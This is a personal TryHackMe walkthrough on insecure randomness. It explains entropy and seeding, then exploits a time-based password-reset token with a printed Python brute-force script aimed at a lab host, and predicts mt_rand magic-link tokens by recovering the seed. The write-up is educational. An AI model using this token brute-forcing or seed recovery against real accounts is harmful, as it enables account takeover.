# Insecure randomness

Yet again, another one. This one was quite a hard one for me to understand, but I got it eventually

Insecure randomness occurs when web applications use predictable or poorly generated random values, making them vulnerable to attacks. While randomness is essential for securing tokens, session IDs, and cryptographic keys, insecure implementation can allow attackers to exploit these predictable values to bypass authentication, hijack sessions, or even decrypt sensitive data. 

Fundamental concepts to better understand this vulnerability are: Randomeness, Entropy, cryptographic keys, session tokens, unique identifiers and seeding

Randomness refers to the lack of pattern or predictability in data, making it an essential component in secure systems.Image of three colorful dice showing different numbers. In cryptography, true randomness ensures an attacker cannot predict values such as keys, tokens, and nonces.

Entropy represents the amount of randomness or unpredictability in a system and is often used to assess the security of cryptographic keys, tokens, or random values. Higher entropy indicates greater uncertainty, making it more difficult for attackers to predict or guess the values, which is essential for secure cryptographic operations. Low entropy can lead to weak security, increasing the risk of attacks like brute-forcing or token prediction. 

Cryptographic keys are secret values used in algorithms to encrypt and decrypt data, ensuring confidentiality, integrity, and authentication. They are critical components in symmetric and asymmetric encryption methods and must be securely generated and managed to prevent unauthorised access. The strength of a cryptographic key depends on its length and randomness.

Session tokens and unique identifiers are used to maintain user sessions and track interactions in web applications. They must be securely generated with sufficient randomness and uniqueness to prevent token prediction and session hijacking. Proper management and protection of these tokens are essential to ensure secure user authentication and authorisation.

Seeding refers to providing an initial value, known as a seed, to a secure cryptographic function to generate a sequence of random-looking numbers. While these secure functions produce numbers that appear random, the sequence is entirely determined by the seed, meaning the same seed will always result in the same sequence.

Skipping to the practical aspect of the room

# Practical Scenario

I was given a login page to work with and this is where things get interesting. I was going to abuse the forgot password feature of the login page.

![image alt](https://github.com/bakel243687/TryHackme/blob/cb958a53a08fb4d547603a04bcaec3cefb907303/Walkthroughs/Images/Screenshot_2025-10-02_23-30-50.png)

![image alt](https://github.com/bakel243687/TryHackme/blob/cb958a53a08fb4d547603a04bcaec3cefb907303/Walkthroughs/Images/Screenshot_2025-10-02_21-25-08.png)

So, I had to understand how the site forgot feature randomness works and with that, I was able to understand the randomness was not random. I got to know that the site sends a link to your email and this link had the userid and the time the token was generated as the token.

> PHP code of the token generation 
		
		$stmt = $db->prepare("SELECT * FROM users WHERE username = :username");

        $stmt->execute([':username' => $user_id]);

        $user = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($user) {

	    $token = $user_id . time();
            $update = $db->prepare("UPDATE users SET reset_token = :token WHERE username = :username");

With this knowledge and the provided python code in the room

> Python code

	import requests
	import sys

	# Function to brute force the reset token
	def brute_force_token(username, start_timestamp):
    	url = "http://random.thm:8090/case/reset_password.php"
    
    # Try tokens within a range of -5 minutes
    	for i in range(-300, 0):
        	current_timestamp = start_timestamp + i
        	token = f"{username}{current_timestamp}"
        	params = {'token': token}
        
        	response = requests.get(url, params=params)
        
        	# Check if the token is valid
        	if "Invalid or expired token." not in response.text:
            print(f"Correct token identified: {token}")
            return token
        else:
            print(f"Tried token: {token} (Invalid)")
    
    	print("No valid token found in the given range.")
    	return None

	if len(sys.argv) != 3:
    	print("Usage: python exploit.py <username> <unix_timestamp>")
    	sys.exit(1)

	username = sys.argv[1]
	start_timestamp = int(sys.argv[2])

	brute_force_token(username, start_timestamp)


![image alt](https://github.com/bakel243687/TryHackme/blob/cb958a53a08fb4d547603a04bcaec3cefb907303/Walkthroughs/Images/Screenshot_2025-10-02_21-25-47.png)

![image alt](https://github.com/bakel243687/TryHackme/blob/cb958a53a08fb4d547603a04bcaec3cefb907303/Walkthroughs/Images/Screenshot_2025-10-02_21-25-33.png)

I can now bruteforce the token with the python code till I get the correct token for the reset password link. With this, I can get access to any account using this means as far as I have the username of the account.



Moving on...........

## Predicted Seed in PRNGs

In this scenario, we will explore how using predictable seeds to generate tokens in a magic link login system can lead to account takeover. The magic link token is generated using PHP's mt_rand() function, which is seeded with a combination of the CRC32 value of the user’s email address and a random constant. By analysing the token generation process, an attacker can reverse-engineer the seed and predict valid tokens.

![image alt](https://github.com/bakel243687/TryHackme/blob/cb958a53a08fb4d547603a04bcaec3cefb907303/Walkthroughs/Images/Screenshot_2025-10-02_23-31-00.png)

Going throught the link generate to the email, the token in the link is a base64 encoding and with analysis of the server-side code provided

> Server-side code

	mt_srand(CONSTANT_VALUE + crc32($email));

	$random_number = mt_rand();
	$token = base64_encode($random_number);


![image alt](https://github.com/bakel243687/TryHackme/blob/cb958a53a08fb4d547603a04bcaec3cefb907303/Walkthroughs/Images/Screenshot_2025-10-02_23-31-33.png)
Image of the CRC32 for the target email

Decoded the Base64 string and got a number

Using php_mt_seed, I ran a scan to get the seed for the number. Upon identifying the seed, I used cyberchef to get the CRC-32 Checksum for the users email. With that, I was able to do the maths of subtracting 970731467 from 970732804, I got 1337 which is the used by the attacker to predict the generated token by adding the value to the CRC32 of the user's email

![image alt](https://github.com/bakel243687/TryHackme/blob/cb958a53a08fb4d547603a04bcaec3cefb907303/Walkthroughs/Images/Screenshot_2025-10-02_23-29-49.png)
